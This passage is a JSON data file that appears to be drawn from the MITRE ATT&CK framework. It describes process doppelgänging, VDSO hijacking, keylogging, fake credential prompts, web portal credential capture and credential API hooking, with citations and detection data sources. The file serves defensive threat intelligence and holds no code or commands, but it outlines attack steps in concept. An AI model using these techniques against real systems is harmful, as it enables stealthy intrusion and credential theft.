    "technique_description": "<p>Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)<!-- raw HTML omitted --><!-- raw HTML omitted -->Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse TxF to a perform a file-less variation of <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1093\">Process Hollowing</a>, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging’s use of TxF also avoids the use of highly-monitored API functions such as <!-- raw HTML omitted -->NtUnmapViewOfSection<!-- raw HTML omitted -->, <!-- raw HTML omitted -->VirtualProtectEx<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->. (Citation: BlackHat Process Doppelgänging Dec 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):<!-- raw HTML omitted --><!-- raw HTML omitted -->* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.<!-- raw HTML omitted -->* Load – Create a shared section of memory and load the malicious executable.<!-- raw HTML omitted -->* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.<!-- raw HTML omitted -->* Animate – Create a process from the tainted section of memory and initiate execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft TxF",
        "url": "https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx",
        "description": "Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Basic TxF Concepts",
        "url": "https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx",
        "description": "Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Where to use TxF",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx",
        "description": "Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Process Doppelgänging Dec 2017",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf",
        "description": "Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "hasherezade Process Doppelgänging Dec 2017",
        "url": "https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/",
        "description": "hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft PsSetCreateProcessNotifyRoutine routine",
        "url": "https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx",
        "description": "Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
    "platform": "windows",
    "tid": "T1055.013",
    "technique": "Process Doppelgänging",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)<!-- raw HTML omitted --><!-- raw HTML omitted -->Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse TxF to a perform a file-less variation of <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1093\">Process Hollowing</a>, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging’s use of TxF also avoids the use of highly-monitored API functions such as <!-- raw HTML omitted -->NtUnmapViewOfSection<!-- raw HTML omitted -->, <!-- raw HTML omitted -->VirtualProtectEx<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->. (Citation: BlackHat Process Doppelgänging Dec 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):<!-- raw HTML omitted --><!-- raw HTML omitted -->* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.<!-- raw HTML omitted -->* Load – Create a shared section of memory and load the malicious executable.<!-- raw HTML omitted -->* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.<!-- raw HTML omitted -->* Animate – Create a process from the tainted section of memory and initiate execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft TxF",
        "url": "https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx",
        "description": "Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Basic TxF Concepts",
        "url": "https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx",
        "description": "Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Where to use TxF",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx",
        "description": "Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Process Doppelgänging Dec 2017",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf",
        "description": "Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "hasherezade Process Doppelgänging Dec 2017",
        "url": "https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/",
        "description": "hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft PsSetCreateProcessNotifyRoutine routine",
        "url": "https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx",
        "description": "Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5",
    "platform": "linux",
    "tid": "T1055.014",
    "technique": "VDSO Hijacking",
    "tactic": "defense-evasion",
    "datasources": "process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via <a href=\"https://attack.mitre.org/techniques/T1055/008\">Ptrace System Calls</a>. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process’ global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO) (Citation: VDSO Aug 2005) (Citation: Syscall 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "ELF Injection May 2009",
        "url": "https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html",
        "description": "O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Backtrace VDSO",
        "url": "https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/",
        "description": "backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VDSO Aug 2005",
        "url": "https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/",
        "description": "Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Syscall 2014",
        "url": "https://lwn.net/Articles/604515/",
        "description": "Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5",
    "platform": "linux",
    "tid": "T1055.014",
    "technique": "VDSO Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via <a href=\"https://attack.mitre.org/techniques/T1055/008\">Ptrace System Calls</a>. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process’ global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO) (Citation: VDSO Aug 2005) (Citation: Syscall 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "ELF Injection May 2009",
        "url": "https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html",
        "description": "O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Backtrace VDSO",
        "url": "https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/",
        "description": "backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VDSO Aug 2005",
        "url": "https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/",
        "description": "Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Syscall 2014",
        "url": "https://lwn.net/Articles/604515/",
        "description": "Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
    "platform": "windows|macos|linux|network",
    "tid": "T1056.001",
    "technique": "Keylogging",
    "tactic": "collection",
    "datasources": "api-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.<!-- raw HTML omitted --><!-- raw HTML omitted -->Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Hooking API callbacks used for processing keystrokes. Unlike <a href=\"https://attack.mitre.org/techniques/T1056/004\">Credential API Hooking</a>, this focuses solely on API functions intended for processing keystroke data.<!-- raw HTML omitted -->* Reading raw keystroke data from the hardware buffer.<!-- raw HTML omitted -->* Windows Registry modifications.<!-- raw HTML omitted -->* Custom drivers.<!-- raw HTML omitted -->* <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/568.html",
        "description": "none",
        "external_id": "CAPEC-568"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
    "platform": "windows|macos|linux|network",
    "tid": "T1056.001",
    "technique": "Keylogging",
    "tactic": "credential-access",
    "datasources": "api-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.<!-- raw HTML omitted --><!-- raw HTML omitted -->Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Hooking API callbacks used for processing keystrokes. Unlike <a href=\"https://attack.mitre.org/techniques/T1056/004\">Credential API Hooking</a>, this focuses solely on API functions intended for processing keystroke data.<!-- raw HTML omitted -->* Reading raw keystroke data from the hardware buffer.<!-- raw HTML omitted -->* Windows Registry modifications.<!-- raw HTML omitted -->* Custom drivers.<!-- raw HTML omitted -->* <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/568.html",
        "description": "none",
        "external_id": "CAPEC-568"
      },
      {
        "source_name": "Adventures of a Keystroke",
        "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
        "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
    "platform": "macos|windows",
    "tid": "T1056.002",
    "technique": "GUI Input Capture",
    "tactic": "collection",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring|user-interface",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/659.html",
        "description": "none",
        "external_id": "CAPEC-659"
      },
      {
        "source_name": "OSX Malware Exploits MacKeeper",
        "url": "https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html",
        "description": "Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "LogRhythm Do You Trust Oct 2014",
        "url": "https://logrhythm.com/blog/do-you-trust-your-computer/",
        "description": "Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Phishing for Credentials Jan 2015",
        "url": "https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/",
        "description": "Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
    "platform": "macos|windows",
    "tid": "T1056.002",
    "technique": "GUI Input Capture",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring|user-interface",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/659.html",
        "description": "none",
        "external_id": "CAPEC-659"
      },
      {
        "source_name": "OSX Malware Exploits MacKeeper",
        "url": "https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html",
        "description": "Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "LogRhythm Do You Trust Oct 2014",
        "url": "https://logrhythm.com/blog/do-you-trust-your-computer/",
        "description": "Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Phishing for Credentials Jan 2015",
        "url": "https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/",
        "description": "Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
    "platform": "linux|macos|windows",
    "tid": "T1056.003",
    "technique": "Web Portal Capture",
    "tactic": "collection",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.<!-- raw HTML omitted --><!-- raw HTML omitted -->This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> and <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/569.html",
        "description": "none",
        "external_id": "CAPEC-569"
      },
      {
        "source_name": "Volexity Virtual Private Keylogging",
        "url": "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/",
        "description": "Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
    "platform": "linux|macos|windows",
    "tid": "T1056.003",
    "technique": "Web Portal Capture",
    "tactic": "credential-access",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.<!-- raw HTML omitted --><!-- raw HTML omitted -->This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> and <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/569.html",
        "description": "none",
        "external_id": "CAPEC-569"
      },
      {
        "source_name": "Volexity Virtual Private Keylogging",
        "url": "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/",
        "description": "Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6",
    "platform": "windows",
    "tid": "T1056.004",
    "technique": "Credential API Hooking",
    "tactic": "collection",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|loaded-dlls|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike <a href=\"https://attack.mitre.org/techniques/T1056/001\">Keylogging</a>,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <strong>Hooks procedures</strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted -->* <strong>Import address table (IAT) hooking</strong>, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Endgame Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<!-- raw HTML omitted -->* <strong>Inline hooking</strong>, which overwrites the first bytes in an API function to redirect code flow.(Citation: Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
